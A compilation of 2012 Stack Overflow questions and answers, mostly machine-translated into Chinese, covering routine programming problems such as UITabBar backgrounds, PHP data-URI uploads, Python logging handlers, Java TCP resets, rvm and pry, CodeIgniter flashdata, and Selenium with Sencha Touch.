虽然我创建了一个新类`@interface UITabBarClass : UITabBar`并在实现中`initWithFrame`添加了以下代码：

```
- (id)initWithFrame:(CGRect)frame {
    self = [super initWithFrame:frame];
    if (self) {
        // Initialization code
        // Change background image
        UIImage *backgroundImage = [UIImage imageWithContentsOfFile:@"uitabbar-background-normal"];

        self.backgroundImage = backgroundImage;
    }
    return self;
} 
```

背景图像不会改变。我也试过用同样的方法写一个日志，它在运行时没有被记录。

任何人都可以提供帮助或建议吗？

提前致谢！:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T22:56:36.373

I fixed this by following this tutorial, please note that you do not need to create 'tabBar1' as it says, just use `self.tabBar`: [http://www.jondack.com/index.php/2010/12/16/customizing-the-background-of-a-uitabbarcontroller/](http://www.jondack.com/index.php/2010/12/16/customizing-the-background-of-a-uitabbarcontroller/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-09T09:26:15.507

利用

```
self.tabBarController.tabBar.backgroundImage = [UIImage....]; 
```

tabBarController 是您的标签栏控制器的名称。

# php - 是否可以使用 jQuery 或 PHP 上传数据 URI？

> ID：11820327
> 
> 赞同：2
> 
> 时间：2012-08-05T21:46:11.330
> 
> 标签：php, javascript, jquery

我现在有这个数组，其中包含很多数据 URI。我之前在代码中这样设置：

```
dataArray = [];
dataArray.push({name : file.name, value : this.result}); 
```

在对数据 URI 做了一些事情之后，我想在用户最终按下上传按钮时上传它们，所以我将数据 URI 传递给 PHP 文件，如下所示：

```
$.each(dataArray, function(index, file) {   

    $.post('upload.php', dataArray[index], function(data) { 
```

并在里面运行一些函数来显示加载栏等。

现在在 PHP 文件 (upload.php) 中我不知道该怎么做。每个数据 URI 都将单独发布到 PHP 文件中，但是我如何处理 PHP 中的数据 URI？通常我会做 $_POST 来获取数据 URI 本身，但我真的不知道如何将其推送到服务器上的文件夹中。我可以将数据 URI 视为普通文件并使用 $_FILES 吗？到目前为止，我还没有取得太大的成功。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-05T22:06:52.280

您的`POST`数据将如下所示：

```
$name = $_POST['name'];
$value = $_POST['value']; 
```

在您*接触*这些变量的值之前，需要先清理所有变量并确认该`$value`变量实际上是一个有效的图像文件。为此，您需要将 data-URI 转换为实际图像。

为此，您需要检查 data-URI 的结构：

```
data:[<MIME-type>][;charset=<encoding>][;base64],<data> 
```

所以为了解析它，你需要编写一个正则表达式从 data-URI 中提取这些信息，解码 base64 编码的图像数据，最后尝试使用 MIME 类型将其解析为图像文件。如果此操作失败，则图像已损坏。如果没有，您可以将其保存到您的服务器。

这听起来可能很复杂，但我怀疑它会花很长时间来实施。

# python - Python 3：从容器字符串中解析日期

> ID：11820329
> 
> 赞同：-1
> 
> 时间：2012-08-05T21:46:32.600
> 
> 标签：python, parsing, datetime, python-3.x

我有一个网页，我正试图从中获得约会。我知道格式是什么，所以解决方案应该像 一样简单[`time.strptime(format)`](http://docs.python.org/py3k/library/time.html#time.strptime)，但问题是：
`If string cannot be parsed according to format, or if it has excess data after parsing, ValueError is raised.`
我正在尝试解析看起来像这样的东西：

```
<tr><td align="center"><b>Create time</b></td>
</tr><tr><td align="center" bgcolor="#DDDDDD">Between August 1, 2012, 8:05 pm and August 1, 2012, 8:06 pm</td> 
```

相应的格式是`%B %d, %Y`（哪个日期并不重要，我只需要一个日期）。
我可以使用正则表达式（例如`([JFMASOND][a-z]{2,8}) ([0-9]{1,2}), ([0-9]{4})`）来获取字符串的相关部分，但是我也可以从正则表达式中获取值本身并自己进行必要的转换。可以这么说，有什么方法可以在容器字符串上使用 strptime 吗？strptime 不应该太难在字符串上继续处理直到它得到格式匹配......
（如果我必须自己做，有没有比正则表达式更好的方法？）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-05T21:56:02.040

我一直使用该[`parsedatetime`](http://code.google.com/p/parsedatetime/)模块从文本中提取日期。它工作得很好：

```
>>> import parsedatetime as pdt
>>> parser = pdt.Calendar(pdt.Constants())
>>> parser.parseDateText('Between August 1, 2012, 8:05 pm and August 1, 2012, 8:06 pm')
daysInMonth(8, 2012)
(2012, 8, 1, 17, 53, 18, 6, 218, 1)
>>> 
```

它接受几乎所有带有缩写的日期格式，除了`Sept.`我已经发布到错误跟踪器但他们拒绝修复它，所以我只是替换`Sept`它`Sep`并且它工作正常。

# python - 替换 Python 记录器的默认处理程序

> ID：11820338
> 
> 赞同：52
> 
> 时间：2012-08-05T21:48:14.863
> 
> 标签：python, logging

我在 wsgi (web2py) 应用程序的每个请求上运行以下代码：

```
import logging, logging.handlers
from logging import StreamHandler, Formatter

def get_configured_logger(name):

    logger = logging.getLogger(name)

    if (len(logger.handlers) == 0):
        # This logger has no handlers, so we can assume it hasn't yet been configured (Django uses similiar trick)

        # === Configure logger ===

        # Create Formatted StreamHandler:
        FORMAT = "%(process)s %(thread)s: %(message)s"
        formatter = logging.Formatter(fmt=FORMAT)
        handler = logging.StreamHandler()
        handler.setFormatter(formatter)
        logger.addHandler(handler)
        logger.setLevel(logging.DEBUG)
        logger.debug('CONFIGURING LOGGER')

    return logger

# Get app specific logger:
logger = get_configured_logger(request.application)
logger.debug("TEST") 
```

这意味着使用我想要的格式化处理程序配置一次记录器。它有效，除了我的标准输出中有双重条目：

```
81893 4329050112: CONFIGURING LOGGER
DEBUG:dummy:CONFIGURING LOGGER
81893 4329050112: TEST
DEBUG:dummy:TEST 
```

如何使用我的新格式化处理程序并摆脱/隐藏默认处理程序？

* * *

## 回答 #1

> 赞同：75
> 
> 时间：2012-08-06T01:12:25.027

也许下面的例子会有所帮助。基本上，您可以删除要禁用的记录器的处理程序，或者不要与您正在记录的记录器一起传播。

```
$ cat testlog.py
import logging
logging.basicConfig(filename='foo', level=logging.DEBUG)
root_logger = logging.getLogger()
root_logger.debug('bar')

my_logger = logging.getLogger('my_logger')
FORMAT = "%(process)s %(thread)s: %(message)s"
formatter = logging.Formatter(fmt=FORMAT)
handler = logging.StreamHandler()
handler.setFormatter(formatter)

my_logger.addHandler(handler)
my_logger.setLevel(logging.DEBUG)
my_logger.info('baz')

my_logger.propagate = False
my_logger.info('foobar')

my_logger.propagate = True
my_logger.info('foobaz')
root_logger.handlers = []
my_logger.info('barbaz')

$ python testlog.py
5927 140735224465760: baz
5927 140735224465760: foobar
5927 140735224465760: foobaz
5927 140735224465760: barbaz

$ cat foo
DEBUG:root:bar
INFO:my_logger:baz
INFO:my_logger:foobaz 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2021-01-21T12:24:43.947

您可以使用以下方法从 getLogger() 中删除默认处理程序：

```
logging.getLogger().removeHandler(logging.getLogger().handlers[0]) 
```

或者在添加所需的处理程序之前先清除现有的处理程序：

```
logging.getLogger().handlers.clear() 
```

这样做之后，这些日志将不再显示，除了您添加的新处理程序：

```
DEBUG: Do stuff
WARNING: Do stuff 
```

# php - 从 Kohana 2 升级到最新的 3.2 版本

> ID：11820341
> 
> 赞同：1
> 
> 时间：2012-08-05T21:48:40.480
> 
> 标签：php, kohana, upgrade, kohana-3

我在 2009 年编写了基于 Kohana 2.3.4 的项目，该项目仍然处于活动状态，并且不时需要修复/创建全新的功能。因为不再支持 Kohana 2 并且整个应用程序堆栈已被弃用，所以我调查了（几次 :) 如何从 Kohana 2 升级到 3 的可能性。我已经知道有很多变化，这不是简单的升级，它更像是重写应用程序。

有人有将 Kohana 2 升级到 3 的真实经验吗？我在文档中找到了“升级”指南，并且在论坛中发现了一些关于升级的模糊陈述。我只是想知道如果我决定升级整个应用程序，我应该期待什么，以及是否有真正重要的特权和优势可以帮助 mi 在应用程序的未来。

谢谢指教！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T19:19:50.977

我将我和你差不多同时写的一个音乐博客从 2.3 升级到了 3.x。我从未发布过更新版本，最终放弃了保留 2.3 版本。我遇到的问题很多，涉及文档不匹配。文档链接有一半时间会指向 3.0 文档。另一半会指向 2.x 文档，然后有时会说它链接到 3.2（当时的版本）文档，但实际上只是 3.0 文档的未修改副本。

情况变得令人沮丧，以至于我最终停止开发新版本。我不需要升级，只是想学习新的 3.x 堆栈，所以我没有丢失任何东西。现在的文档可能会更好，但当时在 3.0 和 3.2 之间有许多未记录的更改阻止了我的开发。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T16:38:18.387

我还在 2008-9 年使用 Kohana 2.3.4 开发了一个项目。最近，我和你自己一样想知道为什么要升级。我的动机是：

*   将加入我的项目的新开发人员不必进入档案获取框架 2.3.4（这是不好的宣传）
*   框架（3.2）代码得到维护并经常更新
*   社区更能帮助 Kohana 3.2
*   社区为 Kohana 3.2 创建了更多模块

不幸的是，升级非常漫长：它将完全重写代码（或 90%）。所有内容的语法更改：路由、模型、目录结构、控制器..

在我最终升级我的项目（这是一条痛苦的道路）之后，我可以说 3.2 的修改和特性提供了一个完全不同的愿景/理念（不是每个人都会赞同），这是非凡的，在我看来，与它一起工作更有趣.

然后，是的，我建议升级。而且，如果你需要帮助，你应该去 IRC :)

# java - 连接重置 + Java SE + TCP

> ID：11820342
> 
> 赞同：0
> 
> 时间：2012-08-05T21:48:49.237
> 
> 标签：java, tcp, connection-reset

我正在开发一个 Java 标准版应用程序。
该应用程序的用户有一个化名。

我的应用程序可以用作服务器。
在这种情况下，一个线程运行以接受来自应用程序客户端实例的连接。
接受连接后，客户端用户将注册到列表中。
服务器线程定期向每个客户端实例广播用户列表。
客户端实例根据服务器实例发送的数据更新其自己的用户列表。

我遇到了一个不系统的问题。
我认为我的问题与 TCP 协议有关。
在我的测试期间，服务器和客户端实例在同一台计算机上运行。
我使用 RawCap 和 Wireshark 捕获了在 127.0.0.1 发送和接收的数据帧。

这是发生问题的场景：

1.  用户 U1 作为服务器执行应用程序。

2.  用户 U2 作为客户端执行应用程序并连接到服务器实例。

3.  服务器实例接受连接。
    我已经捕获了用于建立连接的帧。
    tns-adv 表示客户端实例，tns-server 表示服务器实例。
    这是框架：

    tns-adv > tns-server [SYN] Seq=0
    tns-server > tns-adv [SYN, ACK] Seq=0 Ack=1
    tns-adv > tns-server [ACK] Seq=1 Ack=1

4.  客户端实例将 U2 的假名发送到服务器实例。
    U2的化名是“Moi”。
    假名后跟一个回车符和一个换行符。
    这是框架：

    tns-adv > tns-server [PSH, ACK] Seq=1 Ack=1 Len=5

5.  服务器实例接收 U2 的化名。TCP 确认会自动发送到客户端实例。
    这是框架：

    tns-server > tns-adv [ACK] Seq=1 Ack=6

6.  服务器实例将 U2 注册到它自己的用户列表中。
    U2 注册在第二个位置。
    服务器将 U2 的位置 (2) 发送到客户端实例。
    该位置后跟一个回车符和一个换行符。
    这是框架：

    tns-server > tns-adv [PSH, ACK] Seq=1, Ack=6 Len=3

7.  客户端实例接收 U2 的位置并将 U2 注册到它自己的列表中的第二个位置。
    TCP 确认会自动发送到服务器实例。
    这是框架：

    tns-adv > tns-server [ACK] Seq=6 Ack=4

8.  服务器实例向客户端实例发送通知。
    该通知用于向客户端实例发送信号以发回证明客户端实例仍然可用的数据。
    通知是“[DISPO ?]”。
    通知后跟回车符和换行符。
    这是框架：

    tns-server > tns-adv [PSH, ACK] Seq=4 Ack=6 Len=11

9.  TCP 确认会自动从客户端实例发送到服务器实例。
    但是客户端实例上的以下 Java 命令块： bufferedReader.readLine()
    该命令应该接收服务器通知。
    在服务器实例上捕获了一个异常，它的消息是：连接重置。
    我已经捕获了重置连接的帧。
    但我不知道为什么这个帧是从客户端实例发送的。
    这是框架：

    tns-adv > tns-server [RST, ACK] Seq=6 Ack=15

**编辑：我添加了以下代码片段以响应评论**

***在客户端实例上的线程上执行的相关 java 命令***

```
// Connect to the server instance.
socket = new Socket(adrIpv4, numPortSvr);

// Instance an object to read data sent by the server instance.
inputStream = socket.getInputStream();
inputStreamReader = new InputStreamReader(inputStream);
bufferedReader = new BufferedReader(inputStreamReader);

// Instance an object to send data to the server instance.
outputStream = socket.getOutputStream();
outputStreamWriter = new OutputStreamWriter(outputStream);
bufferedWriter = new BufferedWriter(outputStreamWriter);

// Send my pseudonym to the server instance.
// Frame sent : Frame 4.
bufferedWriter.write(monJoueur.getPseudonyme());
bufferedWriter.newLine();
bufferedWriter.flush();

// Wait for my position in the user list from the server instance.
// Frame received : Frame 6.
chaine = bufferedReader.readLine();

// Register myself into this instance's user list at the position received from the server instance. 
partie.setJoueurAtPosition(monJoueur, position);

// Wait for an availability request from the server instance.
// Frame expected : Frame 8.
// That command blocks and the reset frame 9 is sent to the server instance.
chaine = bufferedReader.readLine(); 
```

***在服务器实例上的线程上执行的相关 java 命令***

```
// Create the server socket.
// Allocate automatically a free port number.
socketServeur = new ServerSocket(0);
partie.setSocketServeur(socketServeur);

// Set the max time the server instance can wait for a connection from a client instance : 500 milliseconds.
socketServeur.setSoTimeout(ThreadCreerPartie.DUREE_ATTENTE_CONNEX);

// Wait 500ms max for a connection from a client instance.
socket = socketServeur.accept();

// Instance an object to read data sent by the client instance.
inputStream = socket.getInputStream();
inputStreamReader = new InputStreamReader(inputStream);
bufferedReader = new BufferedReader(inputStreamReader);

// Instance an object to send data to the client instance.
outputStream = socket.getOutputStream();
outputStreamWriter = new OutputStreamWriter(outputStream);
bufferedWriter = new BufferedWriter(outputStreamWriter);

// Wait for the client's pseudonym.
// Frame received : Frame 4.
chaine = bufferedReader.readLine();

// Registrer the client into this instance's user list at the first available position.
positionJoueur = partie.inscrireJoueur(socket, chaine);

// Send the client's position in the user list to the client instance.
// Frame sent : Frame 6.
bufferedWriter.write(String.valueOf(positionJoueur));
bufferedWriter.newLine();
bufferedWriter.flush();

// Send an availability request to the client instance.
// Frame sent : Frame 8.
bufferedWriter.write("[DISPO ?]");
bufferedWriter.newLine();
bufferedWriter.flush();

// Receive the availability proof from the client instance.
chaine = null;
chaine = bufferedReader.readLine(); //< Raises an exception with the message : Connection reset. 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-06T20:46:50.203

[RST, ACK] 会出现，因为您的客户端不再在侦听套接字。代理可能已崩溃或超时并放弃连接。操作系统可能正在为已经放弃的客户端发送 RST ACK。

# ruby - 如何在 Debian Linux for ARM 上运行 pry

> ID：11820343
> 
> 赞同：5
> 
> 时间：2012-08-05T21:48:57.810
> 
> 标签：ruby, gem, rvm, pry, raspberry-pi

我使用 Debian Linux 在 Raspberry Pi 上安装了 rvm 和 Ruby 1.9.3p194。当我使用pry 安装时`gem install pry`，一切都安装得很好，但是在终端中输入 pry 不起作用：

```
pi@raspberrypi ~ $ pry
bash: pry: command not found 
```

中有一个撬文件`~/.rvm/gems/ruby-1.9.3-p194/bin`。我必须在同一目录中使用 ruby​​_noexec_wrapper 调用它：

```
pi@raspberrypi ~ $ .rvm/gems/ruby-1.9.3-p194/bin/pry
/usr/bin/env: ruby_noexec_wrapper: No such file or directory
pi@raspberrypi ~ $ cd .rvm/gems/ruby-1.9.3-p194/bin
pi@raspberrypi ~/.rvm/gems/ruby-1.9.3-p194/bin $ ./ruby_noexec_wrapper pry
[1] pry(main)> 
```

在这个 Linux 中运行 pry 的正确方法是什么？在 Windows 和 Mac OS XI 上，只需在任何命令提示符或终端键入 pry。

***更新***：这是我的`rvm info`：

```
pi@raspberrypi ~/.rvm/gems/ruby-1.9.3-p194/bin $ rvm info

ruby-1.9.3-p194:

  system:
    uname:       "Linux raspberrypi 3.1.9+ #168 PREEMPT Sat Jul 14 18:56:31 BST 2012 armv6l GNU/Linux"
    bash:        "/bin/bash => GNU bash, version 4.2.20(1)-release (arm-unknown-linux-gnueabihf)"
    zsh:         " => not installed"

  rvm:
    version:      "rvm 1.14.10 (stable) by Wayne E. Seguin <wayneeseguin@gmail.com>, Michal Papis <mpapis@gmail.com> [https://rvm.io/]"
    updated:      "1 day 23 hours 36 minutes 30 seconds ago"

  ruby:
    interpreter:  "ruby"
    version:      "1.9.3p194"
    date:         "2012-04-20"
    platform:     "armv6l-linux-eabi"
    patchlevel:   "2012-04-20 revision 35410"
    full_version: "ruby 1.9.3p194 (2012-04-20 revision 35410) [armv6l-linux-eabi]"

  homes:
    gem:          "/home/pi/.rvm/gems/ruby-1.9.3-p194"
    ruby:         "/home/pi/.rvm/rubies/ruby-1.9.3-p194"

  binaries:
    ruby:         "/home/pi/.rvm/rubies/ruby-1.9.3-p194/bin/ruby"
    irb:          "/home/pi/.rvm/rubies/ruby-1.9.3-p194/bin/irb"
    gem:          "/home/pi/.rvm/rubies/ruby-1.9.3-p194/bin/gem"
    rake:         "/home/pi/.rvm/gems/ruby-1.9.3-p194@global/bin/rake"

  environment:
    PATH:         "/home/pi/.rvm/gems/ruby-1.9.3-p194/bin:/home/pi/.rvm/gems/ruby-1.9.3-p194@global/bin:/home/pi/.rvm/rubies/ruby-1.9.3-p194/bin:/home/pi/.rvm/bin:/usr/lib/arm-linux-gnueabihf/libfm:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
    GEM_HOME:     "/home/pi/.rvm/gems/ruby-1.9.3-p194"
    GEM_PATH:     "/home/pi/.rvm/gems/ruby-1.9.3-p194:/home/pi/.rvm/gems/ruby-1.9.3-p194@global"
    MY_RUBY_HOME: "/home/pi/.rvm/rubies/ruby-1.9.3-p194"
    IRBRC:        "/home/pi/.rvm/rubies/ruby-1.9.3-p194/.irbrc"
    RUBYOPT:      ""
    gemset:       "" 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T23:35:21.100

首先确保 rvm 已正确加载：

```
type rvm | head -n 1 # should be: rvm is a function
type gem | head -n 1 # should be: gem is a function 
```

如果它们不是函数，这意味着 RVM 没有正确加载，这可能是你的 shell 中的一个错误（如有限的 bash），你可以尝试使用以下方法修复它：

```
rvm get head --auto 
```

执行此命令后可能需要重新登录才能运行所有 shell 配置文件。

接下来，确保使用 rvm：

```
rvm use 1.9.3
echo $PATH
echo $GEM_PATH # those two need match those from `rvm info`
rvm info 
```

您还可以将一颗红宝石设置为默认值：

```
rvm use 1.9.3 --default 
```

刷新 PATH - 在终端中输入

```
hash -r # OR:
PATH="$PATH" 
```

甚至重新登录应该对此有所帮助。

# php - Codeigniter falshdata 中是否有最大长度？

> ID：11820345
> 
> 赞同：0
> 
> 时间：2012-08-05T21:49:15.993
> 
> 标签：php, codeigniter, session, error-handling

我问这个的原因是我对我想传递给下一个视图的一个愚蠢的小消息感到生气。所以如果我这样做：

```
if(!$this->paypal_pro->APICallSuccessful($PayPalResult['ACK']))
        {
            var_dump($PayPalResult['ERRORS']);
            $message=array();
            foreach ($PayPalResult['ERRORS'] as $row => $error){
                // $message['flashError'][$row]['L_SHORTMESSAGE'] = $error['L_SHORTMESSAGE'];
                $message['flashError'][$row]['test'] = "The Session class permits you maintain a user's";
                // $message['flashError'][$row]['L_ERRORCODE'] = $error['L_ERRORCODE'];
                // $message['flashError'][$row]['L_LONGMESSAGE'] = $error['L_LONGMESSAGE'];
            }
            // print_r($message);
            $this->session->set_flashdata($message);

            redirect('main/Form');
        } 
```

它工作得很好，但如果我这样做：

```
 if(!$this->paypal_pro->APICallSuccessful($PayPalResult['ACK']))
    {
        var_dump($PayPalResult['ERRORS']);
        $message=array();
        foreach ($PayPalResult['ERRORS'] as $row => $error){
            // $message['flashError'][$row]['L_SHORTMESSAGE'] = $error['L_SHORTMESSAGE'];
            $message['flashError'][$row]['test'] = "The Session class permits you maintain a user's  and track their activity while";
            // $message['flashError'][$row]['L_ERRORCODE'] = $error['L_ERRORCODE'];
            // $message['flashError'][$row]['L_LONGMESSAGE'] = $error['L_LONGMESSAGE'];
        }
        // print_r($message);
        $this->session->set_flashdata($message);

        redirect('main/Form');
    } 
```

它不起作用。

我在这里以 main/form 显示 falshdata：

```
<?php if($this->session->flashdata('flashError')):?>
        <div class='flashError'>
    <?php   
        print_r($this->session->flashdata('flashError'));
    ?>
        </div>
    <?php endif?> 
```

您可以猜到我正在尝试将 Payal 的错误消息拉到视图中以进行错误处理。谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T22:08:13.073

在 Codeigniter 中，整个会话数据的一般大小是有限的，是的。这也包括闪存消息。

这是因为默认情况下它适用于 cookie，并且 cookie 的大小有限。

防止这种情况的简单方法是使用基于数据库的会话或 PHP 本机会话适配器之一。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-06T09:29:33.817

I had lots of issues with sessions (which are essentially [cookies by default](http://codeigniter.com/user_guide/libraries/sessions.html) in Codeigniter unless you store in the db). The session size (or cookie size) depends on the browser but I think the norm is around 3k - so won't handle what you are proposing to do.

I wasn't so sure about storing the session details in the db, so added the [native sessions library](https://github.com/EllisLab/CodeIgniter/wiki/Native-session) and it has been much easier (and less buggy). You can still use the CI flashdata feature with this library (as well as set session data like $this->session->set_userdata('foo', $foo), but it allows you to use sessions just like you were using native PHP i.e. you can print_r($_SESSION) - which I don't think you can do with default session features in CI.

Here's a post with some more information: [CodeIgniter sessions vs PHP sessions](https://stackoverflow.com/questions/2005552/codeigniter-sessions-vs-php-sessions)

# javascript - 从字符串中获取价格

> ID：11820347
> 
> 赞同：0
> 
> 时间：2012-08-05T21:49:26.627
> 
> 标签：javascript, regex, numbers

我正在尝试使用 jquery 从字符串中获取价格和加号或减号。
我很确定正则表达式是要走的路，但我只是看不到它是正确的。

**输入：**
Bla bla bla bla（- 0.25 欧元）

**应该输出：**
direction = -
amount = 0.25

我应该使用什么正则表达式？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T22:12:38.950

在 JavaScript（没有 jQuery 正则表达式）中，使用

```
var results = input.match(/\(([+-])\s*€\s*(\d+\.\d{2})\)/); 
```

对于您的输入，[匹配](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/String/match)的结果是：

```
results[0]: "(- € 0.25)"
results[1]: "-"
results[2]: "0.25"
results.index: 16 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-05T22:06:03.910

```
"[^€]*€[ ]*\([.[:digit:]]*\).*" -> "\1" 
```

这是POSIX。你可以这样使用它：

```
sed "s|[^€]*.[ ]*\([.[:digit:]]*\).*|\1|" 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-05T21:56:58.410

尝试这样的事情：

```
/^(.+) \((\- ){0,1}€ ([0-9\.]+)\)$/ 
```

# rdf - 使用 SPARQL 获取标签的类、子类、超类、属性和实例

> ID：11820352
> 
> 赞同：1
> 
> 时间：2012-08-05T21:50:31.863
> 
> 标签：rdf, sparql

我有一个名为原谅的标签，我想使用 SPARQL 查询语言获取此标签的类、子类、超类、属性和实例。请问我该如何构建这些查询？非常感谢您的回复。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T06:42:15.240

如评论中所述，问题的要点是查找数据集中所有出现的文字。

在 RDF 三元组（主体、属性、对象）中，文字只能作为对象出现。在这种情况下，我们不关心主题和属性是什么。一切都被接受。

下面的查询就是这样做的（注意我们只想要`'forgiveness'`一个英文单词）：

```
SELECT * WHERE{
 ?subject ?property "forgiveness"@en .
} 
```

针对[DBpedia sparql 端点](http://dbpedia.org/sparql)运行它会产生一些结果。你可以试试。我必须说这是 DBpedia 上非常罕见的文字。

另一种方法是使用过滤器而不是普通文字。`'forgiveness'`无论大小写如何，以下查询都会找到。

```
SELECT * WHERE{
 ?subject ?property ?literal .
 FILTER regex(?literal, "forgiveness", "i")
} 
```

for的第二个参数`regex`是要匹配的模式。您可以实现的不仅仅是不区分大小写。有关更多信息，请查看[XQuery 正则表达式语言](http://www.w3.org/TR/xpath-functions/#regex-syntax)

# java - 有没有办法重置或清除串行“正在使用的端口”状态？

> ID：11820356
> 
> 赞同：2
> 
> 时间：2012-08-05T21:50:49.720
> 
> 标签：java, debugging

我正在将一些调试代码添加到将跟踪数据打印到串行端口的程序中。打印一些数据后，串口会出现“PortInUseException”的情况。为了继续调试，我需要写入串口。我知道我正在调试的软件没有使用该端口，但出于某种我不知道的原因，即使我自己打开了该端口，也可能会没收该端口。有什么方法可以重置端口以便我可以再次使用它？

# c# - mdiChild 表单的问题

> ID：11820361
> 
> 赞同：1
> 
> 时间：2012-08-05T21:51:32.487
> 
> 标签：c#, winforms, devexpress, mdi, mdichild

我正在使用 DevExpress DXperience，并创建了一个包含 MdiChild 表单的 MDI 应用程序。

1）我在 Program.cs 文件“DevExpress Dark Style”中设置为默认皮肤，它也适用于子窗体，唯一的问题是标题栏的皮肤没有改变。我尝试了这段代码`Form.LookAndFeel = "DevExpress Dark Style";`，但它给了我这个错误：

> 无法将属性或索引器“LookAndFeel”分配给 - 它是只读的。

当我选择更换皮肤时，同样的问题`skinsRibbonPageGroup`。

2）当我运行 MDI 子窗体时，它应该`ScrollBar`在我更改其尺寸时显示一个，但这不会发生。

![在此处输入图像描述](../Images/37ba12167c58c396ece0edb758f6993a.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-06T08:05:03.860

1) 您应该使用[SkinManager.EnableMdiFormSkins](http://documentation.devexpress.com/#WindowsForms/DevExpressSkinsSkinManager_EnableMdiFormSkinstopic)方法为 MDI 子 XtraForms 启用标题栏皮肤功能。

相关文章：

1.  [皮肤](http://documentation.devexpress.com/#WindowsForms/CustomDocument2399)
2.  [观感](http://documentation.devexpress.com/#WindowsForms/CustomDocument2397)

2）由于缺乏信息，很难确定第二个问题的原因。我建议您将滚动条[问题直接报告](http://www.devexpress.com/Support/Center/Question/Create)给 DevExpress 支持中心，并提供一个说明问题的小示例项目。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T15:23:44.573

解决了 ！

第一个解决方案是 DmitryG 的回答。

```
DevExpress.Skins.SkinManager.EnableMdiFormSkins(); 
```

对于第二种解决方案，我联系了 DevExpress 支持中心，他们告诉我，这种行为是由于我的 ChildForm 实例不自动显示滚动条造成的，为了避免这种情况，只需将 AutoScroll 属性设置为 ChildForm 实例的 true 值.

```
this.AutoScroll = true; 
```

# selenium - 使用 Selenium 测试 Sencha 2 应用程序

> ID：11820363
> 
> 赞同：3
> 
> 时间：2012-08-05T21:51:40.427
> 
> 标签：selenium, sencha-touch-2

我无法单击 Sencha 2 生成的按钮，因为它不是输入字段。它使用 div 和 span 构建按钮。

找到了这个链接，它描述了如何通过 Selenium 测试点击按钮 [http://mobilewebqa.blogspot.com/](http://mobilewebqa.blogspot.com/)

问题：如何点击煎茶触控按钮？Selenium 内置的 click、click_at 等方法不起作用。

解决方案：使用以下步骤伪造 Sencha Touch 点击事件：

```
focus
mouse_down
mouse_up 
```

但是我如何从 Selenium 调用这个事件呢？

感谢您收到任何其他关于如何测试 UI 的好建议。我看到有人提到Siesta，有人用过吗？

[http://www.bryntum.com/products/siesta/](http://www.bryntum.com/products/siesta/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T21:59:43.727

这是我用来模拟点击按钮的步骤，但我们使用的是 Capybara、RSpec 和 Selenium：

```
page.find("span", :text => Regexp.new(THE_BUTTON_LABEL)).click 
```

希望你能从中有所收获...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T20:28:13.950

您必须找到某种方法将 Selenium 引导到 Question 中的按钮。

使用正则表达式会起作用，但我相信最好为按钮添加属性，因为它可以让正在发生的事情更加明显。

使用浏览器插件，您可以按记录，然后返回并从 Selenium 选择标准的下拉列表中进行选择。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-27T15:38:17.437

您可以通过 Selenium 执行 Javascript。所以你可以使用 Ext.ComponentQuery。

```
((JavascriptExecutor) driver).executeScript("var button = 
Ext.ComponentQuery.query('mypanel button')[0]; 
button.fireEvent('tap',button)"); 
```

这不漂亮但有效。

# android - 如何在android的谷歌地图上旋转图片，

> ID：11820365
> 
> 赞同：0
> 
> 时间：2012-08-05T21:52:23.573
> 
> 标签：android, google-maps, overlay, drawimage

我有很多 Ovarlay 项目，我可以把它们都画出来，我的问题是我如何将图像旋转到南北向西，请帮助我

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-08-05T22:20:23.077

如果你只需要它在 0,90,180 和 270 度，那么只需创建四个图像，每个图像都旋转到适当的角度，然后选择你想要的。

# python - Python urlparse.unparse_qsl？

> ID：11820366
> 
> 赞同：5
> 
> 时间：2012-08-05T21:52:39.443
> 
> 标签：python, urlparse

在 Python 的 urlparse 中，可以使用 urlparse 来解析 URL，然后 parse_qsl 来解析查询。

我想*删除*一个查询（名称，值）对，然后重建 URL。

有一个 urlunparse 方法，但没有 unparse_qsl 方法。

从 qsl 列表重建查询的正确方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-06T00:41:35.353

```
>>> urlparse.parse_qsl('q=stackoverflow')
[('q', 'stackoverflow')]

>>> urllib.urlencode(urlparse.parse_qsl('q=stackoverflow'))
'q=stackoverflow' 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-05T21:58:55.417

函数 urllib.urlencode 是合适的。

# jquery - 在 jquery 中定位元素 - 没有向上/向下滑动

> ID：11820372
> 
> 赞同：1
> 
> 时间：2012-08-05T21:53:39.310
> 
> 标签：jquery

jquery 新手。希望是显示/隐藏水平菜单栏项目。我已经尝试了几次迭代但没有成功。

CSS 正在工作和样式化，以及在 onload 事件中将`li`和`a`标记类设置为“活动”的 javascript。我错过了什么？我得出的结论是错误在 jquery 中，尽管它不能简单得多。解释有帮助。我将不胜感激使用现有 html 的建议。

div id=menu 的主要目的是使栏居中。

我的脚本

**编辑 1**

```
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>

$(document).ready(function() {
    $('#nav li').hover(function() {
        //show its submenu
        $('ul', this).slideDown(100);
    }, function() {
        //hide its submenu
        $('ul', this).slideUp(100);
    });
});​ 
```

我的 HTML

```
<div id="menu">
